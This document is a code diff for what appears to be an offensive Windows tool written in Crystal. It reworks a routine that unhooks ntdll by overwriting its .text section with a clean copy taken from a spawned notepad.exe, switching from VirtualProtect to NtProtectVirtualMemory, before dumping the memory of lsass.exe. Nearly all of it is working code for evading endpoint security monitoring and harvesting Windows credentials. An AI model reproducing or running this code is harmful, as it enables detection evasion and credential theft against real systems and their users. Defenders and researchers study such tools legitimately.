@@ -25,7 +25,8 @@ lib Ntdll
   fun NtQueryVirtualMemory(process_handle : Pointer(Void), base_address : Pointer(Void), memory_information_class : UInt32, memory_information : Pointer(UInt8), memory_information_length : UInt64, return_length : Pointer(UInt64)) : UInt32
   fun NtClose(handle : LibC::HANDLE) : UInt32
   fun NtTerminateProcess(process_handle : LibC::HANDLE, exit_status : Int32) : UInt32
-  fun NtProtectVirtualMemory(process_handle : Pointer(Void), base_address : Pointer(Void), region_size : Pointer(UInt32),  new_protect : UInt32, old_protect : Pointer(UInt32)) : UInt32
+  #fun NtProtectVirtualMemory(process_handle : Pointer(Void), base_address : Pointer(Void), region_size : Pointer(UInt32),  new_protect : UInt32, old_protect : Pointer(UInt32)) : UInt32
+  fun NtProtectVirtualMemory(process_handle : UInt64, base_address : Pointer(Pointer(Void)), region_size : Pointer(UInt64), new_protect : UInt32, old_protect : Pointer(UInt32)) : Int32
 end
 
 
@@ -775,23 +776,22 @@ end
 
 # Overwrite hooked ntdll .text section with a clean version
 def replace_ntdll_txt_section(unhooked_ntdll_txt : Void*, local_ntdll_txt : Void*, local_ntdll_txt_size : UInt32)
-  # VirtualProtect to PAGE_EXECUTE_WRITECOPY
   dw_old_protection = UInt32.new(0)
-  current_process = Pointer(Void).new(UInt64::MAX) # -1_i32 # (HANDLE)(-1) is equivalent to the current process in Windows API
-  local_ntdll_txt_size_uint = local_ntdll_txt_size.to_u32
-
+  current_process = UInt64::MAX
+  region_size_ptr = Pointer(UInt64).malloc(1)
+  region_size_ptr.value = local_ntdll_txt_size
   dw_old_protection = UInt32.new(0)
-  vp_res = LibC.VirtualProtect(local_ntdll_txt, local_ntdll_txt_size.to_u32, PAGE_EXECUTE_WRITECOPY, pointerof(dw_old_protection))
-  #vp_res = Ntdll.NtProtectVirtualMemory(
-  #  current_process, 
-  #  pointerof(local_ntdll_txt), 
-  #  pointerof(local_ntdll_txt_size_uint), 
-  #  PAGE_EXECUTE_WRITECOPY, 
-  #  pointerof(dw_old_protection)
-  #)
-  if vp_res != 1      # != 0
+  
+  # NtProtectVirtualMemory to PAGE_EXECUTE_WRITECOPY
+  vp_res = Ntdll.NtProtectVirtualMemory(
+    current_process, 
+    pointerof(local_ntdll_txt), 
+    region_size_ptr, 
+    PAGE_EXECUTE_WRITECOPY, 
+    pointerof(dw_old_protection)
+  )
+  if vp_res != 0      # != 0
     puts "[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)"
-    puts "vp_res #{vp_res}"
     exit(1)
   end
 
@@ -804,28 +804,24 @@ def replace_ntdll_txt_section(unhooked_ntdll_txt : Void*, local_ntdll_txt : Void
   end
   #STDIN.gets
 
-  vp2_res = LibC.VirtualProtect(local_ntdll_txt, local_ntdll_txt_size.to_u32, dw_old_protection, pointerof(dw_old_protection))
-  # VirtualProtect back to the original protection (PAGE_EXECUTE_READ)
-  #vp_res2 = Ntdll.NtProtectVirtualMemory(
-  #  current_process, 
-  #  pointerof(local_ntdll_txt), 
-  #  pointerof(local_ntdll_txt_size_uint), 
-  #  dw_old_protection, 
-  #  pointerof(dw_old_protection)
-  #)
-  if vp2_res != 1
+  # NtProtectVirtualMemory back to the original protection (PAGE_EXECUTE_READ)
+  vp2_res = Ntdll.NtProtectVirtualMemory(
+    current_process, 
+    pointerof(local_ntdll_txt), 
+    region_size_ptr, 
+    dw_old_protection, 
+    pointerof(dw_old_protection)
+  )
+  if vp2_res != 0
     puts "[-] Error calling NtProtectVirtualMemory (restoring old protection)"
     exit(1)
   end
 end
 
 
-def replace_ntdll_txt_section()
-  process_path = "C:\\Windows\\System32\\notepad.exe" # Change to target process
+def remap_library(process_path : String)
   unhookedNtdllTxt = get_ntdll_from_debug_proc(process_path)
-  #puts "Ntdll text section copied to buffer at: 0x#{unhookedNtdllTxt.address.to_s(16)}"
-
-  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
+  currentProcess = Pointer(Void).new(UInt64::MAX)
   localNtdllHandle = custom_get_module_address(currentProcess, "ntdll.dll")
   result = get_text_section_info(Pointer(Void).new(localNtdllHandle))
   localNtdllTxtBase = result[0]
@@ -966,7 +962,7 @@ def crystalDump(output_file : String)
     return
   end
   lsass_handle = get_process_by_name("c:\\windows\\system32\\lsass.exe")
-  puts "[+] Lsass handle: \t#{lsass_handle.address}"
+  puts "[+] Lsass handle: \t\t#{lsass_handle.address}"
   
   # Lock
   os_info = get_windows_version()
@@ -1010,9 +1006,9 @@ def main()
 
   option_parser.parse
   if remap_ntdll
-    replace_ntdll_txt_section()
+    process_path = "C:\\Windows\\System32\\notepad.exe"
+    remap_library(process_path)
   end
-
   crystalDump(output)
 end
 
